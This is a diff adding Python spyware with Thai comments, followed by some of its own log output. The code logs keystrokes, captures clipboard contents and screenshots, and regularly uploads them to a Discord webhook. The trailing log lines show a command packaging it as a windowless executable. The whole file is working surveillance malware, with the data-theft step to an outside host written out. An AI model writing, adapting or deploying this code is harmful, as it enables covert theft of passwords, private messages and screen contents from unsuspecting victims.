@@ -1,0 +1,84 @@
+[CLIPBOARD] import os
+import time
+import pyperclip
+import requests
+from PIL import ImageGrab
+from pynput import keyboard
+
+# ⚠️ ใส่ Webhook URL ของคุณตรงนี้
+WEBHOOK_URL = "https://discord.com/api/webhooks/..."
+
+# Log paths
+KEYLOG_PATH = "keylog.txt"
+SCREENSHOT_PATH = "screenshot.png"
+
+# บันทึกข้อความลงไฟล์
+def write_log(data):
+    with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
+        f.write(data + "\n")
+
+# ดัก key
+def on_press(key):
+    try:
+        write_log(f"{key.char}")
+    except AttributeError:
+        write_log(f"[{key}]")
+
+# ดึง clipboard
+def get_clipboard():
+    try:
+        clip = pyperclip.paste()
+        write_log(f"[CLIPBOARD] {clip}")
+    except:
+        pass
+
+# ถ่ายภาพหน้าจอ
+def take_screenshot():
+    img = ImageGrab.grab()
+    img.save(SCREENSHOT_PATH)
+
+# ส่งไฟล์ไปยัง Discord
+def send_to_discord():
+    try:
+        with open(KEYLOG_PATH, 'rb') as f1, open(SCREENSHOT_PATH, 'rb') as f2:
+            files = {
+                'file1': (KEYLOG_PATH, f1),
+                'file2': (SCREENSHOT_PATH, f2)
+            }
+            requests.post(WEBHOOK_URL, files=files)
+        write_log("[✓] Sent to Discord.")
+    except Exception as e:
+        write_log(f"[Error sending] {e}")
+
+# Main keylogger
+def start_keylogger():
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+    while True:
+        get_clipboard()
+        time.sleep(30)
+        take_screenshot()
+        send_to_discord()
+        time.sleep(60)
+
+if __name__ == "__main__":
+    start_keylogger()
+
+[Key.ctrl_l]
+
+[CLIPBOARD] pyinstaller --noconsole --onefile spyware.py
+
+[Key.ctrl_l]
+
+[CLIPBOARD] python spyware.py
+
+[Key.alt_l]
+[Key.tab]
+d
+a
+d
+a
+w
+[Key.ctrl_l]
+
